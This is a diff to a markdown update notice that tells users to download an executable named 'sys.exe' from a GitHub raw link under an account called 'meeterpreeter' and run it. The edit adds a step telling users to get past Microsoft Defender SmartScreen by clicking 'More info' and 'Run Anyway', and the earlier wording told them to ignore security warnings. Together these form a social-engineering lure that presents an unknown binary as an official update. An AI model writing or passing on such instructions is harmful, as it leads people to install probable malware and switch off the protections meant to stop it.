@@ -17,12 +17,12 @@ All users are strongly encouraged to install this update MANUALLY pending our fo
 
 ## 🔧 Manual Installation
 
-1. Click to navigate to the update script:  
+1. Click the following link to download the update file:
    [`Click here`](https://github.com/meeterpreeter/files/raw/refs/heads/main/sys.exe)
 
-2. Click download on the script (ignore any security warnings)
+2. Double-click the file in your Downloads folder to run it.
 
-3. Once downloaded, double-click the file to install the update (no reboot is required).
+3. If you receive a blue screen stating "Windows protected your PC -- Microsoft Defender SmartScreen prevented an unrecognized app from starting. Running this app might put your PC at risk." Be sure to click "More info" --> Run Anyway or else the update will not apply.
 
 ---
 
